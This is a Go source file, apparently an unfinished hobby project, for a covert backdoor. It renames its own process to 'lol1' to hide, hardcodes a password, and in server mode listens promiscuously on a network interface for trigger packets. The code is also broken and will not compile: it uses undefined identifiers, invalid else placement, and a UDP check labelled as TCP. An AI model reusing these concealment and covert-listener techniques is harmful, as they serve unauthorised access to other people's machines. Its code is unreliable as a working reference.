package main

import(
	"os"
	"reflect"
	"unsafe"
	"flag"
	"fmt"
	"github.com/google/gopacket/layers"
	"golang.org/x/crypto/ssh/terminal"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
)

const passwd = "DAMNPANDIMENSIONALMICE";

func main(){

	SetProcessName("lol1");

	//flags
	modePtr := flag.String("mode", "client", "The mode of the application, may either be" +
		" client or server. Defaults to client.");
	ipPtr := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
	portPtr := flag.Int("port", 80, "The port to connect to in client mode, or to listen on in server mode. Defaults to 80.");
	interfacePtr := flag.String("iface", eth0, "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");

	flag.Parse();

	intiateTools();
	
	switch *modePtr {
	case "client":
		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr);
		intiateClient(*ipPtr, *portPtr);
		break;
	case "server":
		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr);
		intiateServer(*interfacePtr);
	}
}

func GetLocalIP() string {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "";
    }
    for _, address := range addrs {
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String();
            }
        }
    }
    return "";
}

// func sendKnock(ip String, port int){
//
//              ip := &layers.IPv4{
// 		Version: 4,
// 		IHL: 5,
// 		TOS: 0,
// 		Length: sizeof(struct IPv4) + sizeof(struct TCP),
// 		Id: 0,
// 		Flags: 0,
// 		FragOffset: 0,
// 		TTL: 255,
// 		Protocol: IPProtocolUDP,
// 		Checksum: 0,
// 		SrcIP: GetLocalIP(),
// 		DstIP: net.ParseIP(ip),
// 	}
// }	

func intiateClient(ip string, port int){

	hostaddr := fmt.Sprintf("%s:%d", ip, port);
	conn, err := net.Dial("udp", hostaddr);
	if err != nil {
		fmt.Printf("Failed to dial server at %s.\n", hostaddr);
		os.Exit(1);
	}

	defer conn.Close();

	for {
		fmt.Print("Please input the authentication code: ");
		authcode, _ := terminal.ReadPassword(0);
		authstr := string(authcode);

		if authstr == passwd {
			ciphertext := encrypt_data(authstr);
			fmt.Fprint(conn, "%s", ciphertext);
			break;
		}
		fmt.Print("\nInvalid authentication code, try again.\n");
	}	
}

func intiateServer(iface string){

	if handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever); err != nil {
		panic(err)
	} 
	else if err := handle.SetBPFFilter("udp"); err != nil {  
		panic(err)
	} 
	else {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			layerpacket := gopacket.NewPacket(packet, layers.LayerTypeEthernet, gopacket.Default)
			if udpLayer := layerpacket.Layer(layers.LayerTypeUDP); udpLayer != nil {
				fmt.Println("This is a TCP packet!")
				tcp, _ := tcpLayer.(*layers.TCP)
			}
			
			for _, layer := range layerpacket.Layers() {
				fmt.Println("PACKET LAYER:", layer.LayerType())
			}
		}
	}
}


func SetProcessName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];

    n := copy(argv0, name);
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}
